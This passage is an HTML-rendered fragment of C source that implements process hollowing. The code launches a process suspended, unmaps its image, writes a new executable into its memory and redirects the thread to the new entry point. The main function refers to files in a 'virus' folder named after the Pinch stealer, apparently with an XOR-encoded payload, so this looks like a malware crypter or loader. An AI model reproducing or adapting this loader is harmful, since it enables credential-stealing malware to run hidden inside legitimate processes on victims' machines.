class="hl_char">/</span>&nbsp;<span class="hl_function"><b>Local</b></span>&nbsp;Process&nbsp;to&nbsp;be&nbsp;Put&nbsp;<span class="hl_function"><b>in</b></span>&nbsp;Memory&nbsp;<span class="hl_function"><b>and</b></span>&nbsp;suspended&nbsp;<span class="hl_char">(</span>Same&nbsp;Exe&nbsp;Here<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetModuleFileName<span class="hl_char">(</span><span class="hl_function">NULL</span><span class="hl_char">,</span><span class="hl_char">(</span>LPWCH<span class="hl_char">)</span>pPath<span class="hl_char">,</span>MAX_PATH<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">char</span><span class="hl_char">*</span>&nbsp;lfMemory<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>int</b></span>&nbsp;fSize<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE<span class="hl_char">*</span>&nbsp;pLocalFile&nbsp;<span class="hl_char">=</span>&nbsp;fopen<span class="hl_char">(</span><span class="hl_quote">&quot;C:\WINDOWS\NOTEPAD.EXE&quot;</span><span class="hl_char">,</span><span class="hl_quote">&quot;rb&quot;</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span><span class="hl_char">!</span>pLocalFile<span class="hl_char">)</span>&nbsp;{printf&nbsp;<span class="hl_char">(</span><span class="hl_quote">&quot;ERROR - could not open file!&quot;</span><span class="hl_char">)</span><span class="hl_comment">;exit (100500);};</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek<span class="hl_char">(</span>pLocalFile<span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">,</span>SEEK_END<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fSize&nbsp;<span class="hl_char">=</span>&nbsp;ftell<span class="hl_char">(</span>pLocalFile<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rewind<span class="hl_char">(</span>pLocalFile<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lfMemory&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span>malloc<span class="hl_char">(</span>fSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread<span class="hl_char">(</span>lfMemory<span class="hl_char">,</span><span class="hl_number">1</span><span class="hl_char">,</span>fSize<span class="hl_char">,</span>pLocalFile<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose<span class="hl_char">(</span>pLocalFile<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span><span class="hl_char">&amp;</span>IDH<span class="hl_char">,</span>lfMemory<span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>IDH<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span><span class="hl_char">&amp;</span>INH<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">void</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>lfMemory<span class="hl_char">+</span>IDH<span class="hl_char">.</span>e_lfanew<span class="hl_char">)</span><span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>INH<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free<span class="hl_char">(</span>lfMemory<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;Just&nbsp;Grabbing&nbsp;Its&nbsp;ImageBase&nbsp;<span class="hl_function"><b>and</b></span>&nbsp;SizeOfImage&nbsp;<span class="hl_char">,</span>&nbsp;Thats&nbsp;all&nbsp;we&nbsp;needed&nbsp;from&nbsp;the&nbsp;<span class="hl_function"><b>local</b></span>&nbsp;process<span class="hl_char">.</span><span class="hl_char">.</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;localImageBase&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;localImageSize&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfImage<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span><span class="hl_char">&amp;</span>IDH<span class="hl_char">,</span>pImage<span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>IDH<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span><span class="hl_char">&amp;</span>INH<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">void</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>pImage<span class="hl_char">+</span>IDH<span class="hl_char">.</span>e_lfanew<span class="hl_char">)</span><span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>INH<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;dwImageSize&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfImage<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;pMemory&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span>malloc<span class="hl_char">(</span>dwImageSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;memset<span class="hl_char">(</span>pMemory<span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">,</span>dwImageSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;pFile&nbsp;<span class="hl_char">=</span>&nbsp;pMemory<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;dwHeader&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfHeaders<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;firstSection&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>pImage<span class="hl_char">+</span>IDH<span class="hl_char">.</span>e_lfanew<span class="hl_char">)</span>&nbsp;<span class="hl_char">+</span>&nbsp;<span class="hl_function">sizeof</span><span class="hl_char">(</span>IMAGE_NT_HEADERS<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span>Sections<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>firstSection<span class="hl_char">)</span><span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>IMAGE_SECTION_HEADER<span class="hl_char">)</span><span class="hl_char">*</span>INH<span class="hl_char">.</span>FileHeader<span class="hl_char">.</span>NumberOfSections<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span>pFile<span class="hl_char">,</span>pImage<span class="hl_char">,</span>dwHeader<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span><span class="hl_char">(</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfHeaders&nbsp;<span class="hl_char">%</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SectionAlignment<span class="hl_char">)</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfHeaders<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfHeaders&nbsp;<span class="hl_char">/</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SectionAlignment<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">+</span><span class="hl_char">=</span>&nbsp;<span class="hl_number">1</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">*</span><span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SectionAlignment<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;pFile&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>pFile&nbsp;<span class="hl_char">+</span>&nbsp;jmpSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;for<span class="hl_char">(</span>dwSectionCount&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">; dwSectionCount &lt; INH.FileHeader.NumberOfSections; dwSectionCount++)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwSectionSize&nbsp;<span class="hl_char">=</span>&nbsp;Sections<span class="hl_char">[</span>dwSectionCount<span class="hl_char">]</span><span class="hl_char">.</span>SizeOfRawData<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span>pFile<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>pImage&nbsp;<span class="hl_char">+</span>&nbsp;Sections<span class="hl_char">[</span>dwSectionCount<span class="hl_char">]</span><span class="hl_char">.</span>PointerToRawData<span class="hl_char">)</span><span class="hl_char">,</span>dwSectionSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span><span class="hl_char">(</span>Sections<span class="hl_char">[</span>dwSectionCount<span class="hl_char">]</span><span class="hl_char">.</span>Misc<span class="hl_char">.</span>VirtualSize&nbsp;<span class="hl_char">%</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SectionAlignment<span class="hl_char">)</span><span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">=</span>&nbsp;Sections<span class="hl_char">[</span>dwSectionCount<span class="hl_char">]</span><span class="hl_char">.</span>Misc<span class="hl_char">.</span>VirtualSize<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">=</span>&nbsp;Sections<span class="hl_char">[</span>dwSectionCount<span class="hl_char">]</span><span class="hl_char">.</span>Misc<span class="hl_char">.</span>VirtualSize&nbsp;<span class="hl_char">/</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SectionAlignment<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">+</span><span class="hl_char">=</span>&nbsp;<span class="hl_number">1</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmpSize&nbsp;<span class="hl_char">*</span><span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SectionAlignment<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pFile&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span><span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_char">(</span><span class="hl_function">DWORD</span><span class="hl_char">)</span>pFile&nbsp;<span class="hl_char">+</span>&nbsp;jmpSize<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;memset<span class="hl_char">(</span><span class="hl_char">&amp;</span>peStartUpInformation<span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>STARTUPINFO<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;memset<span class="hl_char">(</span><span class="hl_char">&amp;</span>peProcessInformation<span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>PROCESS_INFORMATION<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;memset<span class="hl_char">(</span><span class="hl_char">&amp;</span>pContext<span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">,</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>CONTEXT<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;peStartUpInformation<span class="hl_char">.</span>cb&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function">sizeof</span><span class="hl_char">(</span>peStartUpInformation<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span>CreateProcess<span class="hl_char">(</span><span class="hl_function">NULL</span><span class="hl_char">,</span><span class="hl_char">(</span>LPWSTR<span class="hl_char">)</span>pPath<span class="hl_char">,</span><span class="hl_function">NULL</span><span class="hl_char">,</span><span class="hl_function">NULL</span><span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">,</span>CREATE_SUSPENDED<span class="hl_char">,</span>&nbsp;<span class="hl_function">NULL</span><span class="hl_char">,</span><span class="hl_function">NULL</span><span class="hl_char">,</span><span class="hl_char">&amp;</span>peStartUpInformation<span class="hl_char">,</span><span class="hl_char">&amp;</span>peProcessInformation<span class="hl_char">)</span><span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pContext<span class="hl_char">.</span>ContextFlags&nbsp;<span class="hl_char">=</span>&nbsp;CONTEXT_FULL<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetThreadContext<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hThread<span class="hl_char">,</span><span class="hl_char">&amp;</span>pContext<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_char">=</span><span class="hl_char">=</span>localImageBase<span class="hl_char">&amp;</span><span class="hl_char">&amp;</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>SizeOfImage<span class="hl_char">&lt;</span><span class="hl_char">=</span>localImageSize<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hProcess<span class="hl_char">,</span><span class="hl_char">(</span>LPVOID<span class="hl_char">)</span><span class="hl_char">(</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_char">)</span><span class="hl_char">,</span>dwImageSize<span class="hl_char">,</span>PAGE_EXECUTE_READWRITE<span class="hl_char">,</span><span class="hl_char">&amp;</span>previousProtection<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NtUnmapViewOfSection<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hProcess<span class="hl_char">,</span><span class="hl_char">(</span>PVOID<span class="hl_char">)</span><span class="hl_char">(</span>localImageBase<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0"><span style="word-break: break-all">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualAllocEx</span><span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hProcess<span class="hl_char">,</span><span class="hl_char">(</span>LPVOID<span class="hl_char">)</span><span class="hl_char">(</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_char">)</span><span class="hl_char">,</span>dwImageSize<span class="hl_char">,</span>MEM_COMMIT&nbsp;<span class="hl_char">|</span>&nbsp;MEM_RESERVE<span class="hl_char">,</span>PAGE_EXECUTE_READWRITE<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WriteProcessMemory<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hProcess<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">void</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_char">)</span><span class="hl_char">,</span>pMemory<span class="hl_char">,</span>dwImageSize<span class="hl_char">,</span><span class="hl_char">&amp;</span>dwWritten<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WriteProcessMemory<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hProcess<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">void</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>pContext<span class="hl_char">.</span><span class="hl_registr"><b>Ebx</b></span>&nbsp;<span class="hl_char">+</span>&nbsp;<span class="hl_number">8</span><span class="hl_char">)</span><span class="hl_char">,</span><span class="hl_char">&amp;</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_char">,</span><span class="hl_number">4</span><span class="hl_char">,</span><span class="hl_char">&amp;</span>dwWritten<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pContext<span class="hl_char">.</span><span class="hl_registr"><b>Eax</b></span>&nbsp;<span class="hl_char">=</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase&nbsp;<span class="hl_char">+</span>&nbsp;INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>AddressOfEntryPoint<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SetThreadContext<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hThread<span class="hl_char">,</span><span class="hl_char">&amp;</span>pContext<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hProcess<span class="hl_char">,</span><span class="hl_char">(</span><span class="hl_function">void</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>INH<span class="hl_char">.</span>OptionalHeader<span class="hl_char">.</span>ImageBase<span class="hl_char">)</span><span class="hl_char">,</span>dwImageSize<span class="hl_char">,</span>previousProtection<span class="hl_char">,</span><span class="hl_number">0</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ResumeThread<span class="hl_char">(</span>peProcessInformation<span class="hl_char">.</span>hThread<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;free<span class="hl_char">(</span>pMemory<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1"><span class="hl_function"><b>int</b></span>&nbsp;_tmain<span class="hl_char">(</span><span class="hl_function"><b>int</b></span>&nbsp;argc<span class="hl_char">,</span>&nbsp;_TCHAR<span class="hl_char">*</span>&nbsp;argv<span class="hl_char">[</span><span class="hl_char">]</span><span class="hl_char">)</span></li><li class="hl_l0">{</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1"><span class="hl_char">/</span><span class="hl_char">/</span>open&nbsp;file</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span>file_to_use&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_quote">&quot;C:\Users\Isupov\Desktop\virus\Pinch_editor\Pinch_editor\Pinch_Editor\winhlp32.exe&quot;</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span>part1<span class="hl_char">=</span><span class="hl_quote">&quot;C:\Users\Isupov\Desktop\virus\Pinch_editor\Pinch_editor\Pinch_Editor\part1.exe&quot;</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>char</b></span>&nbsp;<span class="hl_char">*</span>part2<span class="hl_char">=</span><span class="hl_quote">&quot;C:\Users\Isupov\Desktop\virus\Pinch_editor\Pinch_editor\Pinch_Editor\part2.exe&quot;</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;size&nbsp;<span class="hl_char">=</span>&nbsp;fisize&nbsp;<span class="hl_char">(</span>part1<span class="hl_char">)</span><span class="hl_char">+</span>fisize&nbsp;<span class="hl_char">(</span>part2<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span><span class="hl_quote">&quot;C:\Users\Isupov\Desktop\virus\Pinch_editor\Pinch_editor\Pinch_Editor\pinch_xor_77_add_1&quot;</span><span class="hl_comment">;</span></li><li 